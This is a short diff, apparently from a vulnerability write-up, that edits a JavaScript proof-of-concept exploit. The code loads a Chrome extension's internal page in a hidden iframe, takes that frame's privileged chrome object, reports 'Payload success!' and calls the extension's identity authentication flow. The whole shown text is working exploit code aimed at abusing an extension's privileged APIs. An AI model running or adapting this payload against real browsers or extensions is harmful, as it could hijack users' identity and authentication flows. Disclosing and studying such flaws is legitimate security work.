@@ -63,7 +63,7 @@ let iframe = document.createElement("iframe");
 iframe.src = "chrome-extension://bpmcpldpdmajfigpchkicefoigmkfalc/views/app.html";
 iframe.style.display = "none";
 iframe.onload = () => {      
-  chrome = window.frames\[0\].chrome;
+  chrome = window.frames[0].chrome;
   console.log(chrome);
   alert("Payload success! Check the console.");
   chrome.identity.launchWebAuthFlow({url:"https://google.com", interactive:true},e=>{});
